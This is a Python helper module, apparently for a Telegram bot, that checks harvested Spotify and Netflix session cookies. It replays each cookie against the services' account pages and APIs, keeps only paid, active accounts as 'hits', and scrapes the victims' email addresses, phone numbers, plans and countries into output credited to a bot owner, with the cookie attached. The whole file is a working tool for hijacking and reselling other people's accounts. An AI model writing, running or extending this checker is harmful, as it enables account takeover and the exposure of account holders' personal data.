# In unzipbot/helpers/cookie_checker_helper.py

import json
import re
import requests

class CookieHelper:
    def __init__(self, mode):
        self.mode = mode.lower()
        self.BOT_OWNER = "@PKBTQ" # As defined in your script

    # --- Methods ported directly from your script ---

    def _plan_name_mapping(self, plan):
        """Maps Spotify plan names to user-friendly names."""
        mapping = {
            "duo_premium": "Duo Premium", "family_premium_v2": "Family Premium",
            "premium": "Premium", "premium_mini": "Premium Mini",
            "student_premium": "Student Premium", "student_premium_hulu": "Student Premium + Hulu",
            "free": "Free"
        }
        return mapping.get(plan, "Unknown")

    def _format_spotify_output(self, data, cookie_content):
        """Formats the full Spotify hit data."""
        plan = self._plan_name_mapping(data.get("currentPlan", "unknown"))
        country = data.get("country", "unknown")
        auto_pay = "True" if data.get("isRecurring", False) else "False"
        trial = "True" if data.get("isTrialUser", False) else "False"
        header = f"PLAN = {plan}\nCOUNTRY = {country}\nAutoPay = {auto_pay}\nTrial = {trial}\nChecker By: {self.BOT_OWNER}\nSpotify COOKIE :👇\n\n\n"
        preview = f"**Plan:** `{plan}`\n**Country:** `{country}`"
        return {"preview": preview, "full": header + cookie_content}

    def _format_netflix_output(self, info, cookie_content):
        """Formats the full Netflix hit data."""
        plan_name = info.get('localizedPlanName', 'N/A').replace("miembro u00A0extra", "(Extra Member)")
        member_since = info.get('memberSince', 'N/A').replace("\\x20", " ")
        max_streams = info.get('maxStreams', 'N/A')
        if max_streams: max_streams = max_streams.rstrip('}')
        extra_members = "No❌" if info.get('showExtraMemberSection') == "false" else ("Yes✅" if info.get('showExtraMemberSection') == "true" else "N/A")

        profile_name = info.get('profileName', 'N/A')
        email = info.get('email', 'N/A')
        email_status = "Verified✅" if not info.get('emailNeedsVerification') else "Needs Verification⚠️"
        phone_number = info.get('phoneNumber', 'N/A')
        
        if info.get('phoneNotAdded'):
            phone_status = "Not Added❌"
        elif info.get('phoneNeedsVerification'):
            phone_status = "Needs Verification⚠️"
        elif info.get('phoneNumber'):
            phone_status = "Verified✅"
        else:
            phone_status = "N/A"

        preview = (
            f"**Plan:** `{plan_name}`\n"
            f"**Country:** `{info.get('countryOfSignup', 'N/A')}`\n"
            f"**Member Since:** `{member_since}`\n"
            f"**Email:** `{email}` ({email_status})\n"
            f"**Phone:** `{phone_number}` ({phone_status})\n"
            f"**Max Streams:** `{max_streams}` | **Extra Member:** `{extra_members}`"
        )
        
        full_data = (
            f"👤 Profile Name: {profile_name}\n"
            f"📧 Email: {email} ({email_status})\n"
            f"📞 Phone: {phone_number} ({phone_status})\n"
            f"----------------------------------------\n"
            f"Plan: {plan_name}\n"
            f"Country: {info.get('countryOfSignup', 'N/A')}\n"
            f"Member since: {member_since}\n"
            f"Max Streams: {max_streams}\n"
            f"Extra members: {extra_members}\n"
            f"----------------------------------------\n"
            f"Checker By: {self.BOT_OWNER}\n"
            f"Netflix Cookie 👇\n\n\n"
        )
        # In your script, the cookie content is appended again in the main update_results function.
        # To match that, we just return the header here. The full content will be assembled in the callback.
        return {"preview": preview, "full": full_data + cookie_content}

    def _extract_netflix_info(self, account_page_html, security_page_html):
        """The exact regex logic from your script, including the phone number fix."""
        patterns = {
            'countryOfSignup': r'"countryOfSignup":\s*"([^"]+)"', 'memberSince': r'"memberSince":\s*"([^"]+)"',
            'membershipStatus': r'"membershipStatus":\s*"([^"]+)"', 'maxStreams': r'"maxStreams":\s*\{\s*"fieldType":\s*"Numeric",\s*"value":\s*(\d+)',
            'localizedPlanName': r'"localizedPlanName":\s*\{\s*"fieldType":\s*"String",\s*"value":\s*"([^"]+)"',
            'showExtraMemberSection': r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
            'profileName': r'data-uia="account-security-page\+account-details-card\+password".*?<p[^>]+>([^<]+)</p>',
            'email': r'data-cl-view="verifyEmail".*?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
            'emailNeedsVerification': r'data-cl-view="verifyEmail".*?Perlu verifikasi',
            'phoneNumber': r'data-cl-view="editPhoneNumber".*?</p>([\d\s-]+[0-9])', # The corrected regex
            'phoneNeedsVerification': r'data-uia="account-security-page\+banner\+verifyPhone"|data-cl-view="editPhoneNumber".*?Requires verification',
            'phoneNotAdded': r'data-cl-view="editPhoneNumber".*?Add a phone number'
        }
        combined_html = account_page_html + security_page_html
        info = {}
        for key, pattern in patterns.items():
            match = re.search(pattern, combined_html, re.DOTALL)
            if key in ['emailNeedsVerification', 'phoneNeedsVerification', 'phoneNotAdded']:
                info[key] = bool(match)
            else:
                info[key] = match.group(1).strip() if match else None
        
        if info.get('localizedPlanName'): info['localizedPlanName'] = info['localizedPlanName'].replace('x28', '').replace('\\', ' ').replace('x20', '').replace('x29', '')
        if info.get('memberSince'): info['memberSince'] = info['memberSince'].replace("\\x20", " ")
        return info

    def _make_netflix_request(self, cookies, url):
        session = requests.Session()
        session.cookies.update(cookies)
        try:
            return session.get(url, timeout=7).text
        except requests.exceptions.RequestException:
            return ""

    def _check_spotify(self, cookie_content):
        is_json = True
        try:
            json.loads(cookie_content)
        except json.JSONDecodeError:
            is_json = False

        cookies = {}
        if is_json:
            for cookie in json.loads(cookie_content):
                if cookie.get('name') and cookie.get('value'): cookies[cookie['name']] = cookie['value']
        else:
            for line in cookie_content.splitlines():
                if line.strip().startswith('#') or not line.strip():
                    continue
                parts = line.strip().split('\t')
                if len(parts) >= 7: cookies[parts[5]] = parts[6]

        if not cookies:
            return {"status": "error", "message": "No valid cookies found."}

        resp = requests.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer", cookies=cookies, headers={'Accept-Encoding': 'identity'}, timeout=7)
        if resp.status_code == 200:
            data = resp.json()
            if self._plan_name_mapping(data.get("currentPlan", "unknown")).lower() == "free":
                return {"status": "invalid", "message": "Free account."}
            return {"status": "hit", "data": self._format_spotify_output(data, cookie_content)}
        else:
            return {"status": "invalid", "message": "Login failed."}

    def _check_netflix(self, cookie_content):
        is_json = True
        try:
            json.loads(cookie_content)
        except json.JSONDecodeError:
            is_json = False
            
        cookies = {}
        if is_json:
            for cookie in json.loads(cookie_content):
                if cookie.get('name') and cookie.get('value'): cookies[cookie['name']] = cookie['value']
        else:
            for line in cookie_content.splitlines():
                if line.strip().startswith('#') or not line.strip():
                    continue
                parts = line.strip().split('\t')
                if len(parts) >= 7: cookies[parts[5]] = parts[6]

        if not cookies:
            return {"status": "error", "message": "No valid cookies found."}

        account_page_html = self._make_netflix_request(cookies, "https://www.netflix.com/YourAccount")
        security_page_html = self._make_netflix_request(cookies, "https://www.netflix.com/account/security")
        if not account_page_html:
            return {"status": "invalid", "message": "Login failed."}

        info = self._extract_netflix_info(account_page_html, security_page_html)
        if info.get('countryOfSignup') and info.get('countryOfSignup') != "null":
            if info.get('membershipStatus') != "CURRENT_MEMBER":
                return {"status": "unsubscribed", "message": "Login OK but not subscribed."}
            return {"status": "hit", "data": self._format_netflix_output(info, cookie_content)}
        else:
            return {"status": "invalid", "message": "Login failed."}

    def check(self, cookie_content):
        """Main checking function that routes to the correct checker."""
        try:
            if self.mode == 'spotify':
                return self._check_spotify(cookie_content)
            elif self.mode == 'netflix':
                return self._check_netflix(cookie_content)
        except Exception as e:
            return {"status": "error", "message": f"An unexpected error occurred: {e}"}